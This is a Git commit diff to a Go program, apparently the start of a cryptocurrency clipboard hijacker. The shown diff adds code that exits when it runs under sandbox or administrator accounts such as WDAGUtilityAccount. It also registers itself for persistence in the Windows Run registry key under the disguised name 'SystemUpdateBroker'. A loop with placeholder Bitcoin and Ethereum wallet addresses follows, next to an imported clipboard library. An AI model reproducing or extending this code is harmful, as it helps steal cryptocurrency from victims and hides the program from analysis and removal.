05c6d74a1a294be6e9947cc9f409da518653da78
plainrocky7 <Plainrocky6@proton.me>
2025-05-18 17:21:47 +0100

    Add files via upload

--- go.mod
+++ go.mod
@@ -2,4 +2,7 @@ module Learning
 
 go 1.24
 
-require github.com/atotto/clipboard v0.1.4 // indirect
+require (
+	github.com/atotto/clipboard v0.1.4
+	golang.org/x/sys v0.33.0
+)
--- main.go
+++ main.go
@@ -2,10 +2,44 @@ package main
 
 import (
 	"github.com/atotto/clipboard"
+	"golang.org/x/sys/windows/registry"
 	"log"
+	"os"
+	"os/user"
+	"path/filepath"
 )
 
 func main() {
+
+	blockedusers := map[string]bool{
+		"admin":              true,
+		"administrator":      true,
+		"WDAGUtilityAccount": true,
+	}
+
+	user, err := user.Current()
+	if err != nil {
+		log.Fatal(err)
+	}
+	if blockedusers[user.Username] {
+		os.Exit(0)
+	}
+
+	exepath, err := filepath.Abs(os.Args[0])
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer key.Close()
+
+	err = key.SetStringValue("SystemUpdateBroker", exepath)
+	if err != nil {
+		panic(err)
+	}
 	for {
 		BTC := "bitcoin address here"
 		ETH := "Etherium address here"
